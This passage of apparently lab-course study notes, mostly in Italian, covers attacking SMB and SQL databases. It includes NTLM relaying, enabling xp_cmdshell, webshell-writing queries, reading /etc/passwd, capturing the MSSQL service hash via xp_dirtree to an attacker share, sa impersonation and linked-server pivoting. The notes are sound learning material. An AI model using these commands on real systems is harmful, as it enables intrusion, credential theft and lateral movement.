@@ -248,3 +248,216 @@ SMB = Off
 Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
 
 `j4k1dibe@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
+
+# Latest SMB Vulnerabilities
+
+Una vuln recente su SMB e' **SMBGhost ** 
+
+
+# Attacking SQL Databases
+
+MySQL e MSSQL sono database relazionali.
+
+Host di database sono target perche' hanno dati sensibili.
+
+## Enumeration
+### Banner Grabbing
+`j4k1dibe@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125`
+
+## Authentication mechanisms
+**MSSQL** supporta due modi di autentiazione: **WIndows Authentication** , molto integrata in Active Directorye **Mixed Mode**.
+MySQL supporta username|password,
+
+CVE-2012-2122 in MySQL 5.6.x ci faceva bypassare autenticazione usando la stessa password sbagliata
+
+
+### Connecting to SQL Server
+`j4k1dibe@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13` linux
+`j4k1dibe@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`  Linux
+`j4k1dibe@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` Using **Windows Authentication**.
+
+`j4k1dibe@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 ` Linux, MSSQL
+
+`C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30` Windows
+
+## Execute Commands
+A volte si possono eseguire comandi tramite il DB.
+
+in **MSSQL** c'e' **xp_cmdshell** che ci permette di avere una command-shell, comunque e' disabilitata di default.
+
+`1> xp_cmdshell 'whoami'`
+
+Se abbiamo i giusti privilegi possiamo abilitarla: 
+
+```
+-- To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1
+GO
+
+-- To update the currently configured value for advanced options.  
+RECONFIGURE
+GO  
+
+-- To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO  
+
+-- To update the currently configured value for this feature.  
+RECONFIGURE
+GO
+```
+
+Ci sono altri modi per ottenere code execution, ad esempio MySQL supporta User Defined Functions, che permette a codice C/C++ di eseguire come funzione in SQL.
+
+## Write Local Files
+
+### Mysql
+MySQL non ha stored procedure come xp_cmdshell pero' possiamo scrivere file nel sistema
+
+`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';` Esempio di caricare una webshell in unaa directory
+
+Questa operazione e' permessa solo se abbiamo i permessi di fare cio', si vede dalla variabile globale **secure_file_priv**
+
+`mysql> show variables like "secure_file_priv";`, se e' vuota possiamo leggere e scrivere.
+
+
+### MSSQL
+
+### Enable OLE Automation process
+```
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+```
+
+### MSSQL Create a File
+```
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+```
+
+
+## Read Local FIles
+
+### Read local files in MSSQL
+
+```
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+```
+
+### Read Local FIles in MySQL
+`mysql> select LOAD_FILE("/etc/passwd");`
+
+## Capture MSSQL Service Hash
+
+Possiamo rubare hash del servizio MSSQL usando **xp_subdirs** o **xp_dirtree**, sono stored procedure non documentate che usano SMB per retrievare una lista di child directory sotto una parent directory. Se facciamo puntare al server SMB la directory listing func forzera' il server ad autenticare e mandare l' HASH del servizio
+
+### Con XP_DIRTREE
+```
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+```
+
+### Con XP_SUBDIRS
+```
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+```
+
+### In ascolto, XP_SUBDIRS
+`j4k1dibe@htb[/htb]$ sudo responder -I tun0` con responder
+
+`j4k1dibe@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support` con Impacket
+
+## Impersonate Existing Users with MSSQL
+
+Il server SQL ha il permesso speciale IMPERSONATE. che permette all' utente di avere permessi di un altro utente.
+
+Prima pero' dobbiamo capire chi possiamo impersonare
+
+```
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+name
+-----------------------------------------------
+sa
+ben
+valentin
+```
+
+### Verifying our current role
+```
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+-----------
+julio   0      
+```
+0 significa che non abbiamo sysadmin rule
+
+Pero' possiamo impersonare ad esempio l' utente SA (che e' sysadmin)
+
+```
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+-----------
+sa
+
+(1 rows affected)
+
+-----------
+          1
+```
+
+
+## Communicaiing with Other Databases with MSSQL
+
+MSSQL ha un opzione detta **linked servers**. sono tipicamente configurati per abilitare il database engine ad eseguire una Transact-SQL statement che include altre tabelle.
+
+praticamente possiamo muoverci lateralmente verso altri SQL server se c'e' questa cnfigurazione
+
+### Identifying linked server
+
+```
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+```
+
+vediamo che il primo e' remoto., invece il secondo c'e' 0 quindi e' un Linked Server
+
+Possiamo usare lo statement **EXECUTE** per eseguire comandi sul linked server
+
+```
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+------------------------------ ------------------------------ ------------------------------ -----------
+DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+
+```
